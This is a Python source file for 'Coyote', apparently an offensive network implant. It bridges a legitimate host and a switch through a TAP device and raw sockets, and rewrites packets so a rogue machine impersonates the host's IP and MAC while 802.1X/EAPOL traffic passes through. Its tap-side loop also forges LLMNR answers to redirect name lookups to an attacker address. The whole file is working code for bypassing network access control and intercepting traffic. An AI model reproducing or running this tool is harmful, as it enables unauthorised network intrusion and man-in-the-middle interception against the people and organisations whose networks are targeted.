# coding=utf-8

from sys import exit
from pytun import *
from scapy.all import *
from MANGLE import *
from CoyoteFangs import *
from Autoconf import *
import socket
import select
import time
from struct import *
from binascii import hexlify,unhexlify

class Coyote:

	def __init__(self):
		if os.geteuid() != 0:
			exit("You need root privileges to play with sockets !")	
		self.isRunning = False
		self.tap = None
		self.s = None
		self.MANGLE = None
		self.hostip = '10.0.0.5'
		#self.hostmac = '\x5c\x26\x0a\x13\x77\x8a'
		self.hostmac = ''
		#self.hostmac = '\x00\x1d\xe6\xd8\x6f\x02'
		#self.hostmacStr = '5c:26:0a:13:77:8a'
		self.hostmacStr = ''
		#self.hostmacStr = "00:1d:e6:d8:6f:02"
		self.verbosity = 3
		self.scksnd1 = None
		self.scksnd2 = None
		self.Autoconf = Autoconf()
		self.CoyoteFangs = CoyoteFangs(self.verbosity) #CoyoteFangs instance
		self.pktsCount = 0
		self.LhostIface = 'eth0'
		self.switchIface = 'eth1'

	def createTap(self):
		self.tap = TunTapDevice(flags=IFF_TAP, name='Coyote')
		self.tap.addr = "192.168.1.150"
		self.tap.netmask = '255.0.0.0'
		self.tap.mtu = 1500
		self.tap.hwaddr = b'\x00\x11\x22\x33\x44\x55'
		self.hwaddrStr = "00:11:22:33:44:55"
		self.tap.persist(True)
		self.tap.up()

	def downTap(self):
		if self.tap != None:
			self.tap.down()

	def bindAllIface(self):
		self.s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))

	def setAttribute(self, attributeName, attributeValue):
		if attributeName == "host_ip":
			self.hostip = attributeValue
		elif attributeName == "host_mac":
			self.hostmac = attributeValue
			tempStr = hexlify(attributeValue).decode('ascii')
			self.hostmacStr = tempStr[:2] + ":" + tempStr[2:4] + ":" + tempStr[4:6] + ":" + tempStr[6:8] + ":" + tempStr[8:10] + ":" + tempStr[-2:]
		elif attributeName == "verbosity":
			if attributeValue >= 0 and attributeValue <= 3:
				self.verbosity = attributeValue
				self.CoyoteFangs.changeVerbosity(self.verbosity)
			else:
				return False
		elif attributeName == "netIface":
			self.switchIface = str(attributeValue)
			self.Autoconf.sockNetwork = self.switchIface
		elif attributeName == "hostIface":
			self.LhostIface = str(attributeValue)
			self.Autoconf.ifaceHost = self.LhostIface
		else:
			return False

	def chooseIface(self,pkt) :
		if pkt[Ether].dst == self.hwaddrStr:
			print("Coyote NIC")
			return 'Coyote'
		elif pkt[Ether].dst == self.hostmacStr or ((pkt[Ether].dst == 'ff:ff:ff:ff:ff:ff' or pkt[Ether].dst == '01:80:c2:00:00:03') and pkt[Ether].src != self.hostmacStr):
			print(str(pkt[Ether].dst) + " Host NIC")
			return self.LhostIface
		else:
			print("Switch NIC")
			return self.switchIface

	# Handles sending mangled traffic
	def sendeth2(self, raw, interface):
		self.scksnd1 = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
		self.scksnd2 = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
		self.scksnd1.bind((self.LhostIface, 0))
		self.scksnd2.bind((self.switchIface, 0))
		if interface == self.LhostIface:
			# This is a dirty hotfix for the fragmentation problem; will be fixed later
			try:
				self.scksnd1.send(raw)
			except:
				pass
		else:
			try:
				self.scksnd2.send(raw)
			except:
				pass
		return

	def initAutoconf(self):
		self.hostip, self.hostmacStr = self.Autoconf.startAutoconf()
		self.hostmac = self.strToHex(self.hostmacStr)
		self.macstr = self.strToHex(self.hostmacStr)  # Set macstr hex value from captured mac string
		print('MAC IS SET: ' + self.hostmacStr)

	def strToHex(self, string):
		hexes = string.split(":")
		hexstr = ''.join(hexes).encode("ascii")
		return unhexlify(hexstr)

	def initMANGLE(self, stop_event):
		self.bindAllIface()
		inputs = [self.s, self.tap]
		last_mangled_request = []
		mycount = 1 ## DECOMISSIONNED
		self.MANGLE = MANGLE(self.hostip, self.tap.addr, self.hostmacStr, self.hwaddrStr, self.verbosity)  # MANGLE instance init # ip host, ip rogue, mac host, mac rogue
		while not stop_event.is_set():
			try:
				inputready,outputready,exceptready = select.select(inputs, [], [])
			except select.error as e:
				break
			except socket.error as e:
				break

			for socketReady in inputready :
				roundstart_time = time.time()
				### FROM NETWORK ###
				if socketReady == self.s :
					packet = self.s.recvfrom(1600)
					raw_pkt = packet[0]
					if raw_pkt not in last_mangled_request: # pour éviter le sniff de paquets déjà traités (to avoid sniffing packets that have already been processed)
						self.pktsCount += 1
						pkt = Ether(packet[0])
						if self.CoyoteFangs.checkRules(pkt) == True:
							if 'IP' in pkt and pkt[IP].dst != '224.0.0.252' and pkt[IP].dst != '10.0.0.255':
								self.MANGLE.pktRewriter(pkt, pkt[IP].src, self.MANGLE.rogue, pkt[Ether].src, self.MANGLE.mrogue)
							last_mangled_request.append(bytes(pkt))
							#print("PKT in rules")
							
							self.tap.write(bytes(pkt))
							break
						elif 'ARP' in pkt and (pkt[Ether].src == self.tap.hwaddr or pkt[ARP].pdst == self.hostip or pkt[ARP].psrc == self.hostip) :		
							epkt = pkt
						elif 'IP' in pkt and (pkt[Ether].src == self.tap.hwaddr or pkt[IP].dst == self.hostip or pkt[IP].src == self.hostip or pkt[IP].dst == '224.0.0.252') :
							epkt = pkt
						elif 'EAPOL' in pkt:
							epkt = pkt
						elif 'BOOTP' in pkt:
							epkt = pkt
						else:
							break
		##### NBT-NS
						if not mycount and 'IP' in epkt and (epkt[IP].dst == '10.0.0.255' and epkt[IP].dport == 137) :
							print("---------- UDP Packet NBT-NS")
							last_mangled_request.append(raw(epkt))
							self.tap.write(raw(epkt))
		##### LLMNR
						elif not mycount and 'IP' in epkt and (epkt[IP].dst == '224.0.0.252' and epkt[IP].dport == 5355) :
							print("---------- UDP Packet LLMNR")
							last_mangled_request.append(raw(epkt))
							self.tap.write(raw(epkt))
		##### fin LLMNR / NBNS
						elif not mycount and 'IP' in epkt and epkt[IP].dport == 445:
							print("IN MY IF-2")
							MANGLE.pktRewriter(epkt, epkt[IP].src, MANGLE.rogue, epkt[Ether].src, MANGLE.mrogue)
							last_mangled_request.append(raw(epkt))
							self.tap.write(raw(epkt))
						else :
							mangled_request = self.MANGLE.Coyote_Address_Translation(epkt)
							ifaceToBeUsed = self.chooseIface(mangled_request)
							if ifaceToBeUsed == 'Coyote':
								self.tap.write(raw(mangled_request))
							else:
								#mangled_request.show2()
								last_mangled_request.append(raw(mangled_request))
								self.sendeth2(raw(mangled_request), ifaceToBeUsed)
					else :
						last_mangled_request.remove(raw_pkt)
				### FROM Coyote ###
				elif socketReady == self.tap:
					self.pktsCount += 1
					buf = self.tap.read(self.tap.mtu)  # test paquet depuis Rogue
					epkt = Ether(buf)  # idem que au dessus
					if epkt not in last_mangled_request:
						mangled_request = self.MANGLE.Coyote_Address_Translation(epkt)
						ifaceToBeUsed = self.chooseIface(mangled_request)

		########### debut LLMNR
						#print str(mangled_request.summary()) + " ----------- IN tap socket loop (after MANGLE)" 
						if 'LLMNRQuery' in mangled_request : 
							print("IN")
							mangled_request[LLMNRQuery].an.rdata = '10.0.0.5'
							del mangled_request[IP].chksum
							if 'UDP' in mangled_request:
								del mangled_request[UDP].chksum
							mangled_request = mangled_request.__class__(raw(mangled_request))
							#ls(mangled_request)
		########### fin LLMNR
						#print(ifaceToBeUsed)
						if ifaceToBeUsed == 'Coyote':
							self.tap.write(raw(mangled_request))
							last_mangled_request.append(mangled_request)
						else :
							#mangled_request.show2()
							###
							if 'IP' in mangled_request and 1 == 2:
								print("before frag")
								frags=fragment(mangled_request, fragsize=500)
								print("after frags")
								for frag in frags:
									frag = frag.__class__(raw(frag))
									last_mangled_request.append(raw(frag))
									self.sendeth2(raw(frag), ifaceToBeUsed)
									#send(frag, iface=ifaceToBeUsed)
							else:
								if 'IP' in mangled_request:
									del mangled_request[IP].len
								#mangled_request = mangled_request.__class__(str(mangled_request))
								#if 'TCP' in mangled_request:
								#	new_mangled_request = self.MANGLE.changeSessID(mangled_request)
								#	mangled_request = new_mangled_request
								last_mangled_request.append(str(mangled_request))
								#if 'TCP' in mangled_request:
								#	#print("[[[")
								#	print(str(mangled_request[TCP].seq) + " : " + str(mangled_request[IP].len))
								#	print("]]]")
								self.sendeth2(raw(mangled_request), ifaceToBeUsed)
							###
					#	last_mangled_request.append(str(mangled_request))
					#	self.sendeth2(str(mangled_request), ifaceToBeUsed)
					else:
						self.tap.write(raw(epkt))
						last_mangled_request.remove(epkt)
				else :
					exit('WTH')
